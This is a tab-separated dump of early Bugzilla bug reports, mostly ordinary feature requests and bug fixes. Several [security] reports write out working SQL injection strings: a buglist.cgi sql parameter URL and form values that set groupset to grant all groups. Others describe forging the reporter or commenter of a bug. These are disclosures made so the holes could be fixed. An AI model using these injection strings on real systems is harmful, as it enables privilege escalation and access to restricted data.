106315%TAB%1003836538%TAB%4080%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla: Other moz.org Issues,Query/Bug List%TAB%Would like to be able to send mail to all QA contacts from query results page%TAB%Would like to be able to send mail to all QA contacts from query results pageBe to be able to send mail to all QA contacts from query results page  1.  Perform any query which will give you some matches 2.  At the query results page, notice that there is a link to mail the bug list to the owners of the bug. 3.  I'd like to have an option to mail the list to the QA contacts of the bugs.  This will be useful for following up on bug verifications for various milestones, areas, etc.
106377%TAB%1003852577%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Email Notifications%TAB%processmail recanall should use lastdiffed,processmail rescanall should use lastdiffed%TAB%processmail recanall should use lastdiffed,processmail rescanall should use lastdiffedInstead of calling 2 functions per row, and only checking for stuff changed in the last two days, rescanall should use the lastdiffed column.  However, it turns out that edit*.cgi doesn't keep the auto-updating delta_ts field the same. As a result, this will (for one run) show false positives. It won't actually send mail, but it probably will take some time.  Ideally, this should be run nightly, to catch email changes which don't get picked up, eg by people pressing stop on their browser too early. I sonsidered adding this to a sanity check, but since: a) this fixes itself on the next comment, b) getting these emails nightly could help catch bugzilla bugs, and c) this will happen in real situations, I didn't think I should.   myk, how long does: "SELECT bug_id from bugs where lastdiffed < delta_ts" take on b.m.o? I'd guess much less that the current stuff, but it may take too long to run nightly.  patch coming.
106640%TAB%1003969191%TAB%17102%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%User Interface%TAB%add translation of system messages%TAB%add translation of system messagesadd translation support of system messages  e.g. labels like "Summary", "Quality Assurance", etc ... without changing the CGI scripts.  The result is a per user/per system setting of the language and some translation files.  an initial approach has already been made (for internal use). but I would like to provide this feature others.
106918%TAB%1004065392%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%Mover handling is borked on move.pl.%TAB%Mover handling is borked on move.pl.When I enter the following for movers:  a@b.com, c@d.com  The code detects c@d.com is a mover on bug_form.pl, but not move.pl.  This is because:  my $movers = Param("movers"); $movers =~ s/\w?,\w?/|/g; $movers =~ s/@/\@/g;  Those \w should be \s.  There should also be a routine that does this for both sides in globals.pl.  For both, that should probably be (\s)* too, not (\s)?.
106993%TAB%1004091739%TAB%5500%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%Spurious corruption error if default platform is not available%TAB%Spurious corruption error if default platform is not availableI have modified the available platforms by removing all the platforms that we don't support.  Now if someone logs in from Linux they get the following error:  Error Message ============= Possible bug database corruption has been detected. Please send mail to stephen@tgivan.com with details of what you were doing when this message appeared. Thank you.   src = All Windows 3.1 Windows 95 Windows 98 Windows 2000 Windows NT Solaris SunOS other default = Linux
107120%TAB%1004159526%TAB%10297%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%User Interface%TAB%templates/default/global/header has invalid HTML%TAB%templates/default/global/header has invalid HTMLWarning (1/1): <!DOCTYPE> is missing. Error (9/3): In the tag <BODY> white space is missing as separator after the attribute "ALINK".  Warning (19/9): In the tag <TD> the attribute "WIDTH" should only contain absolute pixel values. Error (28/9): In tag <TD> the value "center" is not valid for attribute "VALIGN".  Error (29/9): In tag <TD> the value "center" is not valid for attribute "VALIGN".
107229%TAB%1004250696%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Creating/Changing Bugs%TAB%Resolution lost due to midair.%TAB%Resolution lost due to midair.Bug #70500 has no resolution.  Perusing bug activity indicates another midair collision incident.  It appears that if someone resolves, and then someone overwrites that, they'll overwrite the resolution but not the status, leaving this situation.  Can we kill the overwrite feature, please?
107379%TAB%1004345256%TAB%31120%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Query/Bug List%TAB%Inconsistent table grouping%TAB%Inconsistent table groupingWhen displaying large (>199 bugs) bug lists, Bugzilla groups 199 bugs into  the first table, and subsequently groups 200 bugs at a time.  This is pretty minor, but I do notice it, and can fix it.  I also want to change  the 200 to 100 if there are no objections.  It seems a little more intuitive,  and since I'm on a slow connection, it would give me feedback sooner.    Change:  1240         $count++; 1241         if ($count % 200 == 0) { 1242             # Too big tables take too much browser memory... 1243             pnl "</TABLE>$tablestart"; 1244         }  to:           if (($count % 100 == 0) && ($count > 0)) {              # Too big tables take too much browser memory...              pnl "</TABLE>$tablestart";          }          $count++;  or:           $count++;          if (($count % 100 == 1) && ($count > 1)) {              # Too big tables take too much browser memory...              pnl "</TABLE>$tablestart";          }
107513%TAB%1004396230%TAB%10297%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Administration%TAB%Can't change params on installation with no webservergroup%TAB%Can't change params on installation with no webservergroupchecksetup.pl, if you have no webservergroup supplied in localconfig, sets the permissions on the data directory to drwxrwxrwt - that is, world writable with the sticky bit set.  The stated purpose of the sticky bit is that any given user can only delete files that they created.  However, it also appears to restrict you from moving/renaming files in that directory as well, if you're not the owner of the directory.  The Param() function attempts to build a data/params file if there are missing params in it by merging the defaults with the existing params file and writing it to a new file, then renaming the new file to the old filename.  I've duplicated this both on Mac OS X (darwin) and on Red Hat 6.2 (linux)  This especially hurts a new install because any CGI in Bugzilla will crash with a 500 Server Error because the data/params file doesn't exist and it can't create one.  On an existing install, trying to run editparams.cgi silently fails to update the changes you made (and doesn't tell you that either)
107580%TAB%1004435101%TAB%16246%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Email Notifications%TAB%"New" announcements should be tweaked to sort before regular email,"New"  bugmail should sort by subject above other bugmail%TAB%"New" announcements should be tweaked to sort before regular email,"New"  bugmail should sort by subject above other bugmailRight now, if you sort by subject, the bugmail arrives and the "New" message is often at the bottom of the pile. This is because the subject of the often starts with a letter before "N", which means it looks like this:  [bug 111] a bad view [bug 111] New: a bad view  If we modified the "new:" string to have have a leading character that is early in the sort order, like <SPACE> + "New:".  Possible problems: hopefully sort order is not different among various mail programs.  Or, someone could figure out why threading is not reliable in Mozilla mail.
107672%TAB%1004458076%TAB%15223%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%Browser OS/Platform discrimination alg sucks%TAB%Browser OS/Platform discrimination alg sucksQNX and BeOS among others are ignored.  I've been doing piecewise mods for a while, here's a revamp.
107718%TAB%1004480457%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%masschange gives all changed bugs the groupset of the first bug in the list%TAB%masschange gives all changed bugs the groupset of the first bug in the listmyk, this should be considered for being a blocker for the b.m.o upgrade.  I noticed this happening once before, but just thought that the wrong button was pushed.  If you do a mass change, then one of the options is to leave everything as it is However, the code to handle this is run once, not once per bug (~ line 564 in process_bug.cgi:      } elsif ($::FORM{"bit-$b"} == -1) {       # If we get here, the user came from the change several bugs form, and       # said not to change this group restriction.  So we'll add this group       # back in only if the bug already has it.       if ($bughasgroup) {         $::query .= " + $b";       }     } For setting/clearing, this is OK, but not for keeping as is. I suspect (but its late, and I haven't tested) that we just need to set groupset to groupset in the init code, rather than 0, and then this branch of the if statements should then be a noop. Removing a group (ie !$bughasgroup && $::FORM{"bit-$b"} == 1) should then just subtract the bit.
107743%TAB%1004501406%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%post_bug.cgi does not properly validate parameters.%TAB%post_bug.cgi does not properly validate parameters.post_bug.cgi needs some real loving.  The initial status can be RESOLVED, the assignee can be blank, etc, etc.  Using a GET URL you can insert all manner of broken bugs.
107918%TAB%1004562473%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Documentation,bugzilla.org%TAB%Perl style guide.%TAB%Perl style guide.We have a documented style guide for Bugzilla code.  Apparently it's in some Perl manual somewhere.  The link to this should be documented in the hackers' guide, rather than including selected excerpts.
107970%TAB%1004595596%TAB%8848%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Administration,Documentation%TAB%access to milestone documents should be restricted to bug groups%TAB%access to milestone documents should be restricted to bug groupsBugzilla has an optional bug group facility which restricts access to products to certain individuals. The milestone document that is related to a product should also have access to it restricted by the bug groups mechanism, for installations where visibility of information is important.
108312%TAB%1004735390%TAB%4897%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%Mid air collision page may not show all updates%TAB%Mid air collision page may not show all updatesWhen a midair collision happens, it only shows the last change made to a bug, not all changes that happened since you loaded the page.  To reproduce: 1. Load a bug (#3 for example) 2. Load the same bug in a different window. 3. Make a change (any field) 4. Click the "Back to bug" link 5. Make another change (still in the different window). 6. Return to the original window and make a change. 7. You'll get a mid-air collision, but only of the things you changed the    second time. 8. Choose to submit your changes anyway.  It will overright both changes,    even though it only showed you one on the Mid Air screen.
108385%TAB%1004817690%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%[security] Possible to add comments to a bug as someone else%TAB%[security] Possible to add comments to a bug as someone else[filed in security group, if you're not there, you won't get mail until bmo is upgraded, and I hope that this is fixed by then, anyway. myk, if you disagree, then open it up]  So, theres this form element, $::FORM{'who'}. And its used as the "comment added by" user. Problem is, the only check done is that the user exists in the db (by quietly_check_login). theres no check that I am that actual user.  Why is this there? Obsolete, or does it have some purpose? I couldn't see where we ever add an input element with a name of 'who'. If the form element isn't there, we use the logged in user's id to grab the name.  Its easy to check that the username matches the logged in user, but I wonder if it may be better to get rid of this stuff entirely. I need to find out why its there first, though...  A user can manually edit the bugs page to spoof the comment - I'll comment as nobody@mozilla.org in a sec.  The only other thing which can be done by exploiting this is to change who processmail thinks did the change, so if excludeSelf is set in the mail prefs, you can make someone not get mail on a change you make. That ones minor, though.
108422%TAB%1004854106%TAB%17444%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Creating/Changing Bugs%TAB%Posting bug page should not say "posting" or "please wait"%TAB%Posting bug page should not say "posting" or "please wait"Little UI niggle:  The posting bug page should not be titled "posting bug please wait" because when I'm rifling through my list of windows, it looks like it's still busy posting the bug, even when it's finished.  I know, I know, it's uber-trivial.
108516%TAB%1004941836%TAB%1%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%It's possible to file a bug as somebody you're not.,[security] It's possible to file a bug as somebody you're not.%TAB%It's possible to file a bug as somebody you're not.,[security] It's possible to file a bug as somebody you're not.f you take the enter bug form and hack it to change the reporter field, you can file a bug as anybody you want... to prove my point, I'm gonna file as nobody :)
108528%TAB%1004947111%TAB%15223%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Creating/Changing Bugs%TAB%knob is not defined doesn't explain to 2001110503 users what to do,knob is not defined error message does not help a user find the error,knob is not a defined error message and it does not help a user find the error,"knob is not defined" error message does not help a user find the error%TAB%knob is not defined doesn't explain to 2001110503 users what to do,knob is not defined error message does not help a user find the error,knob is not a defined error message and it does not help a user find the error,"knob is not defined" error message does not help a user find the errorBugzilla Bug 108526 preSelected radio buttons in forms aren't preselected  Please make the knob is not defined message suggest checking to see if ( ) Leave bug as ... is set.
108547%TAB%1004951658%TAB%15223%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%HTML Form Controls,Creating/Changing Bugs,attachment and request management%TAB%javascript error,javascript error in attachment.cgi - using bad DOM Style code%TAB%javascript error,javascript error in attachment.cgi - using bad DOM Style codeError: small.style.getProperty is not a function Source File: http://bugzilla.mozilla.org/attachment.cgi?id=56564&action=edit Line: 212  this build is generally borked, i'm not sure what caused this. oh wait, sure i am :-)
108581%TAB%1004964476%TAB%33620%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Installation & Upgrading%TAB%CPAN::Bugzilla needs to be updated for the Bugzilla v2.16 release,Bundle::Bugzilla needs to be updated on CPAN for the Bugzilla v2.16 release%TAB%CPAN::Bugzilla needs to be updated for the Bugzilla v2.16 release,Bundle::Bugzilla needs to be updated on CPAN for the Bugzilla v2.16 releaseCPAN::Bugzilla will need to be updated with the new modules and new versions of modules listed in checksetup.pl before or coinciding with the Bugzilla v2.16 release.
108812%TAB%1005083358%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%[security] We allow the user to send arbitary SQL!!!!!%TAB%[security] We allow the user to send arbitary SQL!!!!!So, buglist.cgi has an sql paramater. And, as long as that doen't contain a semicolon, we send it. Oops.  The above url will allow you to see the title of a test security group bug. Its more complicated than it looks - bugzilla.mozilla.org/buglist.cgi?sql=1%3E2)%20OR%20(bugs.bug_id=106544 (%3E is >, and %20 is space) would work as well, except that then we join the users table cubed then, without conditions, and that takes a long long long long long time on bmo.  This was presumably added for advanced query support, or something. Lets kill it. Its a huge hole, and even if we someone patch it up it sitll makes me nervous.  This turned up another bug, which I discovered over the weekend - my SelectVisible stuff does "WHERE (security conditions) AND other stuff" rather than "WHERE (security conditions) AND (other stuff)". That wouldn't have helped in this case, though, because the extra bracketing could have been easily removed. Fixing that may be interesting, since the where clause isn't the end - we have to search for HAVING/GROUP BY in the rest of the where, while still letting people search for bugs containing the word having. I have no idea how to do that. I was vaguely aware of this when I wrote the support, but all places which use that code use AND. If someone can tell me how to fix it, I will.
108821%TAB%1005087474%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%User Accounts%TAB%users with blessgroupset!= 0 can change any groupset,[security] users with blessgroupset!= 0 can change any groupset%TAB%users with blessgroupset!= 0 can change any groupset,[security] users with blessgroupset!= 0 can change any groupsetSimply change the value of one of the form elements in editusers.pl to something like:  value="-$fudge+9223372036854775807"  You can find out the value to plug in for $fudge by entering a bogus value, and looking at the sql error. Stuff may be on the right, too, so take that into account.  We don't validate the entries against the blessgroupset, and we just read in the raw values anyway.
108822%TAB%1005087750%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%User Accounts%TAB%[security] Any user can change their groupset!%TAB%[security] Any user can change their groupset!userprefs.cgi has:      SendSQL("UPDATE profiles SET mybugslink = '" . $::FORM{'mybugslink'} .             "' WHERE userid = $userid");  playing with the mybugslink value on the form lets you do:  value="1', groupset='9223372036854775807"  It needs to be sqlescaped.
108870%TAB%1005110434%TAB%36800%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%User Accounts,Email Notifications%TAB%Bugzilla does not set email prefs for new user until user visits userprefs.cgi%TAB%Bugzilla does not set email prefs for new user until user visits userprefs.cgiI have a bugzilla setup using LDAP to verify user accounts.  For a first time login CGI::confirm_login() will call globals.pl::InsertNewUser(username,realname) to insert the user into the profiles table.  However, no email preferences are set for that user until he/she visits the userprefs.cgi page.  Is this the expected behavior?  The excerpt below is from userprefs.cgi to verify that it expects to see no emailflags set.  sub showAdvancedEmailFilterOptions() ...     SendSQL("SELECT emailflags FROM profiles WHERE userid = $userid");      ($flags) = FetchSQLData();      # if the emailflags haven't been set before, that means that this user      # hasn't been to (the email pane of?) userprefs.cgi since the change to      # use emailflags.  create a default flagset for them, based on     # static defaults.      #     if ( !$flags ) {         $flags = $defaultEmailFlagString;         setEmailFlags($flags);     } ...  I believe $defaultEmailFlagString should be a definable parameter and set in the InsertNewUser function.  I'm guessing that this isn't a problem for non-LDAP logins because those users will most likely goto userprefs.cgi and change their passwords (in which case the above function will set their emailflags).  Is there any associated with setting their emailflags in globals.pl::InsertNewUser()?  Do we want this to be an installation definable (e.g. a parameter) setting?  Let me know you comments and I'll submit the patch.
108982%TAB%1005148515%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla-General%TAB%Need to enable taint mode%TAB%Need to enable taint modeThe last couple of days have shown that we need to get the taint stuff enabled. I think we can do this in 3 stages:  1) Run all scripts with -T 2) Turn DBI taint on, but filter the return value from FetchSQLData with trick_taint  3) Remove the filter.  1 should be relatively easy, since processmail runs that way already. Anywhere 2 breaks is probably a security bug. 3 may be more difficult.
108987%TAB%1005150541%TAB%16115%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla-General%TAB%script to use quoteUrls() on texts provided by user,Linkify script to use GetBugLink on texts provided by user,Linkify script to use quoteUrls on texts provided by user%TAB%script to use quoteUrls() on texts provided by user,Linkify script to use GetBugLink on texts provided by user,Linkify script to use quoteUrls on texts provided by userusing kiko's description: a page called bugify.cgi that offers a textarea, that works like this: enter text with numbers interspersed and the numbers become links with title="summary" added. this is for helping asa produce daily summaries and the weekly updates.
109008%TAB%1005177311%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Creating/Changing Bugs,attachment and request management%TAB%Footer on create attachment page looks wrong.%TAB%Footer on create attachment page looks wrong.The footer looks wrong on the create attachment page.  In N4, it has a very thick top border and too much vertical space.  In Mozilla, it has a very thick bottom border.
109012%TAB%1005178774%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Documentation,bugzilla.org%TAB%Hackers' Guide - The three questions.%TAB%Hackers' Guide - The three questions.Whenever you're fixing a bug, you should ask yourself three questions:  1. Where else in the codebase might this bug occur.  Make sure these are fixed as well or reported. 2. How could you, or the Bugzilla team in general, prevent this problem in future?  Consider reusable subs that could be introduced, or tests that could be added to the testing suite. 3. Could this have regressed anything?
109013%TAB%1005178960%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Documentation,bugzilla.org%TAB%Hackers' Guide - Consider security implications of your code.%TAB%Hackers' Guide - Consider security implications of your code.Some of our security holes have been through neglecting checks, rather than introducing bad code.  It would be useful if the hackers' guide recommended thinking about if code changes have any security implications.  Also, it could suggest thoroughly checking data as a matter of course, even if its not security related.  We haven't been too good about this in the past and it has bitten us.
109034%TAB%1005191247%TAB%3977%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Reporting/Charting%TAB%support for chart/reports based on keywords%TAB%support for chart/reports based on keywordsI would like to se support for summary reports/charts like this:  "number of open bugs with the keyword <xx>" where <xx> is any given keyword  defined in the bugzilla installation.
109048%TAB%1005197182%TAB%26507%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs,attachment and request management%TAB%can not create attachments%TAB%can not create attachmentsi already logged in when i created a new bug. after that, i wanted to add an attachment, but after filling in the form to create an attachment,  when i clicked 'commit', it says:  The name <TT></TT> is not a valid username.  Either you misspelled it, or the person has not registered for a Bugzilla account. <P>Please hit the <B>Back</B> button and try again.  i've tried both with last mozilla, and IE 5.0
109138%TAB%1005223468%TAB%4415%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%platform detection not working on macintosh%TAB%platform detection not working on macintoshThis an email sent to me by Andy Lyttle the day after the b.m.o upgrade to the bugzilla cvs tip. Did the mozilla user agent change or did bugzilla detection?   --------------------------- I clicked the link to http://bugzilla.mozilla.org/enter_bug.cgi?product=Browser and got this:  Possible bug database corruption has been detected. Please send mail to endico@mozilla.org with details of what you were doing when this message appeared. Thank you.  src = All Windows 3.1 Windows 95 Windows 98 Windows ME Windows 2000 Windows NT Windows XP Mac System 7 Mac System 7.5 Mac System 7.6.1 Mac System 8.0 Mac System 8.5 Mac System 8.6 Mac System 9.x MacOS X Linux BSDI FreeBSD NetBSD OpenBSD AIX BeOS HP-UX IRIX Neutrino OpenVMS OS/2 OSF/1 Solaris SunOS other default = Macintosh
109240%TAB%1005246440%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%User Interface,Email Notifications,attachment and request management%TAB%second line of comment in email is too long when attachment created%TAB%second line of comment in email is too long when attachment createdWhen you create an attachment, a comment is submitted to the bug about it.  Email then gets sent out about the attachment creation, and that email contains the comment.  The second line of the comment is too long and looks really horrible.
109306%TAB%1005286287%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Reporting/Charting%TAB%Product specific duplicates page.%TAB%Product specific duplicates page.The duplicates page bmo is useless for the Bugzilla bugs beause we don't get anywhere near as many reports as for Mozilla.  It should be for a specific set of products, or segregated on product, or something.
109354%TAB%1005296245%TAB%14006%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Creating/Changing Bugs%TAB%Attachment link on newly entered bug refers to old form%TAB%Attachment link on newly entered bug refers to old formSteps to reproduce problem: 1. Enter a new bug 2. Click on the "attach a file to this bug" link  Actual results: old attachment screen  Expected results: new create attachment screen as per link on bug form
109357%TAB%1005297481%TAB%32335%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%Boolean chart values set to 0 don't "stick" when adding new charts%TAB%Boolean chart values set to 0 don't "stick" when adding new chartsIf I have a boolean chart, for example Attachment Status of needs-work equal 0, and add another boolean chart the 0 will be lost.  1 liner coming up.
109474%TAB%1005339030%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%User Accounts%TAB%Move null account from 0 to NULL.,Database should contain NULL instead of 0 everywhere for "no account" or "empty"%TAB%Move null account from 0 to NULL.,Database should contain NULL instead of 0 everywhere for "no account" or "empty"We should move account IDs over to using NULL rather than 0 for no account.  This would enable referential integrity constraints on accounts (at the moment there is no ID 0 record on profiles), as well as allowing foreign keys to be set up as NOT NULL, so we can prevent null accounts from being in various places.
109480%TAB%1005344562%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Creating/Changing Bugs%TAB%Remove createattachment.cgi from CVS.%TAB%Remove createattachment.cgi from CVS.createattachment.cgi should be removed from CVS once it is no longer used. 
109528%TAB%1005385323%TAB%10297%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%Can't query for attachment status != value if patch has no statuses%TAB%Can't query for attachment status != value if patch has no statusesIf you query for patches that don't have a particular status value, the query will fail to match patches that don't have any statuses yet.
109529%TAB%1005386267%TAB%21544%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla-General,User Interface%TAB%bug# and bug summary should be aligned, in "create new attachment" page%TAB%bug# and bug summary should be aligned, in "create new attachment" pageReproducible steps:  1. Click "create a new attachment" 2. See that the bug# and the bug's summary are not horizontally aligned to each  other.  It would look better if they were aligned.
109530%TAB%1005388068%TAB%4897%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%xml.cgi double (and in some cases triple) quoting special characters.%TAB%xml.cgi double (and in some cases triple) quoting special characters.This is caused by the fact that Bug.pm runs some fields through QuoteXMLChars() or html_quote() when it populates its hash and then runs them through QuoteXMLChars() again when it outputs the XML in emitXML().  Bug.pm's hash of values should not quote the data in any way.  It should provide "raw" data that can be quoted depending on the needs of the caller, not just arbitrarily html/xml quoted.  Also, QuoteXMLChars() has a bug in it in that the order it quotes can cause the & to get quoted again (making it triple quoted).
109573%TAB%1005419429%TAB%27869%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Email Notifications%TAB%Should not send email notifications when new CCs have been added,New bugzilla accounts should by default have 'CC field changes' turned off%TAB%Should not send email notifications when new CCs have been added,New bugzilla accounts should by default have 'CC field changes' turned offNotifiying people by default when new CCs have been added to a bug clogs mailboxes and wastes bandwith, and I doubt people are helped much by it. By default, bugzilla should not send notifications when new people have been added to CC.
109679%TAB%1005498276%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%[security] fieldx-x-x values not validated%TAB%[security] fieldx-x-x values not validatedI found this while enabling taint mode.  The above url will show you the summary of the test security group bug on bmo.  Not sure how to fix this - we can't sqlquote it, because its a field name. Maybe check for a lack of spaces?
109690%TAB%1005509397%TAB%29274%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%[security] longlist.cgi doesn't check that $bug is valid%TAB%[security] longlist.cgi doesn't check that $bug is validSee above url, again made more complicated to avoid stalling bmo. This one comes very close to giving up the comments, too, but fails the attachments table lookup with an invalid column id. You can get arround that by adding something like 1<2, but then you get every single comment in the db. You don't want that :)  patch coming
109802%TAB%1005579524%TAB%38795%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Installation & Upgrading%TAB%checksetup.pl fails to connect to mysql database,checksetup.pl fails to connect to mysql database - password not escaped in localconfig%TAB%checksetup.pl fails to connect to mysql database,checksetup.pl fails to connect to mysql database - password not escaped in localconfigFor future reference, the reporter mailed me his localconfig file privately... the problem was that he had "$" and "@" characters in his database password, which were not escaped in the variable declaration in localconfig.  Reopening, since using special characters in a password is something people are pretty likely to do, and not everyone editing that file is going to know Perl.  Suggested fix: the comment that is generated with the $db_pass variable should indicate that special characters need to be escaped in the string.
110012%TAB%1005682761%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Creating/Changing Bugs%TAB%Spank show_bug.cgi hard - templatize and combine%TAB%Spank show_bug.cgi hard - templatize and combineshow_bug.cgi, process_bug.cgi, show_activity.cgi, xml.cgi and bug_form.pl should all be one templatised CGI called show_bug.cgi.   This will bring bug activity inline, make XML output the template it was always meant to be, stop people bookmarking process_bug.cgi, and generally make life nicer all round.   This will involve a _severe_ spanking. :-)  I believe this is the way to go to templatise the bug display code.
110152%TAB%1005748250%TAB%4432%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%User Interface%TAB%Make BugZilla use CSS2 "paged media" instead of the seperate "format for printing"-link,Make BugZilla use CSS2 "paged media" instead of the separate "format for printing" link,Offer CSS2 "paged media" for people who print the show_bug page%TAB%Make BugZilla use CSS2 "paged media" instead of the seperate "format for printing"-link,Make BugZilla use CSS2 "paged media" instead of the separate "format for printing" link,Offer CSS2 "paged media" for people who print the show_bug pageRFE: BugZilla use CSS2 "paged media" styles for it's pages instead of offering the seperate "format for printing"-link.
110276%TAB%1005809876%TAB%29933%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla: Other moz.org Issues,Bugzilla-General%TAB%SQL error in globals.pl%TAB%SQL error in globals.plIf you click on "Show dependency graph" for any bug, check "Show the summary of all bugs" on the new page, and click Submit again, you get:  Software error: select bug_status, short_desc from bugs LEFT JOIN cc selectVisible_cc ON bugs.bug_id = selectVisible_cc.bug_id AND selectVisible_cc.who = 29933 WHERE ((bugs.groupset & 0) = bugs.groupset OR (bugs.reporter_accessible = 1 AND bugs.reporter = 29933) OR (bugs.assignee_accessible = 1 AND bugs.assigned_to = 29933) OR (bugs.qacontact_accessible = 1 AND bugs.qa_contact = 29933) OR (bugs.cclist_accessible = 1 AND selectVisible_cc.who = 29933 AND not isnull(selectVisible_cc.who))) AND bug_id = 102293: Column: 'bug_id' in where clause is ambiguous at globals.pl line 222. I believe SelectVisible() is doing this to us, as it now pulls in additional tables that have bug_id in them.  The solution appears to be to s/AND bug_id/AND bugs.bug_id/ towards the end of the SQL statement (that the only place I see an unqualified bug_id).
110503%TAB%1005908035%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla-General%TAB%GetVersionTable() rethink,GetVersionTable() needs to go away,GetVersionTable() needs to go away (into Bugzilla::DataCache),Move versioncache variables into Bugzilla->cache object or appropriate modules,Move versioncache variables into appropriate modules,Eliminate versioncache%TAB%GetVersionTable() rethink,GetVersionTable() needs to go away,GetVersionTable() needs to go away (into Bugzilla::DataCache),Move versioncache variables into Bugzilla->cache object or appropriate modules,Move versioncache variables into appropriate modules,Eliminate versioncacheWe need to think about GetVersionTable(), which gets called by most CGIs even if they don't use all the info it provides.   Currently, it uses the versioncache file - has it been proved that this is more effective than some finer-grained request system which accesses the DB every time for just the data needed?  Should the info returned be security-filtered by default? Currently we are doing this filtering, to remove hidden products and components, in a lot of different scripts, which opens up the possibility of bugs and differences. We could have a param which said "ignore this user's security - give me the whole lot".
110603%TAB%1005986475%TAB%31219%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla: Other moz.org Issues,Bugzilla Helper,Bugzilla-General%TAB%Bugzilla Helper needs to include Win XP in pulldown%TAB%Bugzilla Helper needs to include Win XP in pulldownThough it's a choice on Query.cgi (http://bugzilla.mozilla.org/query.cgi), Win XP isn't yet included in the OS choices for Bugzilla Helper: http://www.mozilla.org/quality/help/bugzilla-helper.html
110692%TAB%1006091187%TAB%15253%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Email Notifications%TAB%Default %newchangedmail% doesn't comply with RFC 2047,Properly encode subjects in newchanged mails.%TAB%Default %newchangedmail% doesn't comply with RFC 2047,Properly encode subjects in newchanged mails.I'm using both Bugzilla and Courier on an in-house-system. After entering a Bug, I get the following message:  Bug 2 posted 550-The headers in this message contain 8-bit text, which violates RFC 2047. 550-Sorry, I cannot accept any mail without the required MIME headers. 550 See for more information. Oh, you simple have to use german umlauts like הצ� in your summary, to get high-ASCII characters. So this is an internationalization problem.  For the appropriate encoding, please have look at RFC 2045. For example, the encoding for 'A' in quoted-printable would be =41
110708%TAB%1006112350%TAB%8444%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%User Interface%TAB%Summary row is aligned badly in new query.cgi%TAB%Summary row is aligned badly in new query.cgiTo reproduce: 1.  View <http://bugzilla.mozilla.org/attachment.cgi?id=50517&action=view>. 2.  View <http://landfill.tequilarista.org/bbaetz/query.cgi>. 3.  Look at the `Summary contains:', `A comment contains:', and `The URL     contains:' fields on the second page.  What you should see: *   The `Summary contains:' label and field is lined up with the labels and     fields for the other items.  What you actually see: *   The `Summary contains:' label and field are crooked.  This makes the page noticably harder to scan.
